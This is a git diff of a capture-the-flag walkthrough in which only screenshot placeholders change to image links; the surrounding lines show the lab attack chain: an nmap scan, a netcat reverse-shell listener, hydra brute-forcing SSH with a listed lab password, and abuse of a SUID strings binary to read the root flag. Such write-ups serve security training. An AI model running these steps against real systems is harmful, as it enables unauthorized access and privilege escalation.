@@ -14,12 +14,12 @@
 nmap -sV IP
 ```
 
-[SCREEN01]
+![SCREEN01](https://github.com/user-attachments/assets/b0f4af15-afa3-4aef-a599-c5a96a5b8ea0)
 
 2. Configure Firefox to access HTTP service on port 22
    - Navigate to `about:config` and set `network.security.ports.banned.override` to **22** as **string**
 
-[SCREEN02]
+![SCREEN02](https://github.com/user-attachments/assets/73675b28-554d-44a7-81f6-183c4bdee304)
 
 3. Analyze the main page source code at `http://<IP>:22/`
 
@@ -47,7 +47,7 @@ steghide extract -sf header.jpg
 nc -lvnp 4444
 ```
 
-[SCREEN03]
+![SCREEN03](https://github.com/user-attachments/assets/a557b073-2370-44fb-a39b-836c76d7df85)
 
 7. Establish stable shell, locate password list and save it to a file
 
@@ -57,7 +57,7 @@ cd /home
 cat jacks_password_list
 ```
 
-[SCREEN04]
+![SCREEN04](https://github.com/user-attachments/assets/be1974a9-bc99-47bf-865e-2c3ee8207a74)
 
 8. Attack SSH service running on port 80
    - The credentials are: **jack:ITMJpGGIqg1jn?>@**
@@ -66,7 +66,7 @@ cat jacks_password_list
 hydra -l jack -P passwords.txt ssh://IP:80
 ```
 
-[SCREEN05]
+![SCREEN05](https://github.com/user-attachments/assets/052ab064-a64a-447f-ba7c-f43cddffe2f7)
 
 9. Log in as jack, download the image, and get the user flag from it
 
@@ -81,7 +81,7 @@ scp -P 80 jack@IP:/home/jack/user.jpg /root/user.jpg
 # Password: ITMJpGGIqg1jn?>@
 ```
 
-[SCREEN06]
+![SCREEN06](https://github.com/user-attachments/assets/b0380548-8ef8-474e-a6e4-b33af54bfeb3)
 
 ---
 
@@ -93,7 +93,7 @@ scp -P 80 jack@IP:/home/jack/user.jpg /root/user.jpg
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-[SCREEN07]
+![SCREEN07](https://github.com/user-attachments/assets/d851d00c-a9cb-4734-997c-580ca5501643)
 
 2. Exploit the SUID `strings` binary to read the root flag
 
@@ -101,4 +101,4 @@ find / -perm -u=s -type f 2>/dev/null
 strings /root/root.txt
 ```
 
-[SCREEN08]
+![SCREEN08](https://github.com/user-attachments/assets/da2c8af4-419d-4a8a-a637-1a1b8df06e54)
